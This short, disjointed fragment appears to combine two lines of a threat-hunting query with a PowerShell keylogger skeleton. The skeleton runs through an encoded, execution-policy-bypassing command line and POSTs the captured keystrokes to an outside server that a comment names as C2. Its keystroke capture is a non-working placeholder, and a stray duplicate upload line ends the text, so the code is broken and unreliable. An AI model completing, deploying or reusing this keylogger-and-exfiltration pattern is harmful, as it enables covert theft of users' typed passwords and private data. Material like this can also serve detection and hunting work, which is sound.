| where process_commandline !contains "C:"
| distinct process_commandline

powershell.exe -Nop -ExecutionPolicy bypass -enc 

$keystrokes = ""
$wshell = New-Object -ComObject wscript.shell

while ($true) {
    $keystrokes += $wshell.SendKeys("GetKeystrokes")  # Replace with actual keylogging logic

    if ($keystrokes.Length -gt 1000) {  # Send data after 1000 characters
        $webclient = New-Object System.Net.WebClient
        $url = "https://bigbrainssmallbrains.net/brain_dump"
        $webclient.UploadString($url, "POST", $keystrokes)  # POST to C2 server
        $keystrokes = ""  # Reset keystrokes buffer
    }
}


$webclient.UploadString($url, "POST", $keystrokes)

